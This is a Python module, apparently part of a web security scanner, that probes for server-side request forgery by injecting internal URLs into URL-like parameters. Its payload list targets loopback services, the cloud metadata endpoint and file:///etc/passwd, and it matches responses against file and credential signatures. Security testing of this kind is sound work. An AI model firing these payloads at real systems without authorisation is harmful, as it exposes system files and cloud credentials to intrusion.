"""
ssrf_probe.py - Server-Side Request Forgery (SSRF) probe.

Injects internal/loopback URLs into parameters that look like they
accept URLs or file paths. Detects responses that indicate the server
made an outbound request.
"""
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import re
from urllib.parse import urlparse, urlencode, urlunparse
from modules.explain import get_explanation
from utils.logger import get_logger

log = get_logger(__name__)

# Parameters likely to accept URLs
URL_PARAMS = {
    "url", "uri", "path", "src", "source", "dest", "destination",
    "redirect", "redirect_url", "return", "return_url", "next",
    "link", "href", "ref", "fetch", "load", "file", "resource",
    "endpoint", "callback", "webhook", "target", "host", "domain",
    "proxy", "forward", "image", "img", "avatar", "icon",
}

# SSRF canary payloads — internal addresses
SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/",           # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://127.0.0.1:22/",             # SSH
    "http://127.0.0.1:3306/",           # MySQL
    "http://127.0.0.1:6379/",           # Redis
    "http://127.0.0.1:8080/",
    "file:///etc/passwd",
]

# Response indicators that suggest SSRF worked
SSRF_INDICATORS = [
    "root:x:",
    "ami-id",
    "instance-id",
    "local-hostname",
    "SSH-",
    "redis_version",
    "mysql_native_password",
    "220 ",                              # FTP/SMTP banner
]


def probe_ssrf(endpoints, requester, explain=False):
    """
    Inject SSRF payloads into URL-like parameters.
    Returns a list of issue dicts.
    """
    issues = []
    tested = set()

    for ep in endpoints:
        url = ep["url"]
        params = ep.get("params", {})

        for param, _ in params.items():
            if param.lower() not in URL_PARAMS:
                continue

            key = f"{url}:{param}"
            if key in tested:
                continue
            tested.add(key)

            for payload in SSRF_PAYLOADS:
                injected = dict(params)
                injected[param] = payload
                parsed = urlparse(url)
                probe_url = urlunparse(parsed._replace(query=urlencode(injected)))

                try:
                    resp = requester._session.get(
                        probe_url, timeout=8, verify=False, allow_redirects=False
                    )
                    body = resp.text

                    for indicator in SSRF_INDICATORS:
                        if indicator in body:
                            issue = {
                                "type": "SSRF: Server-Side Request Forgery",
                                "endpoint": url,
                                "param": param,
                                "payload": payload,
                                "risk": "Critical",
                                "detail": f"Response contains SSRF indicator: '{indicator}'",
                                "confidence": "High",
                            }
                            if explain:
                                issue["reason"] = get_explanation("ssrf")
                            issues.append(issue)
                            log.debug(f"SSRF confirmed: {url} param={param}")
                            break

                except Exception:
                    pass

    return issues
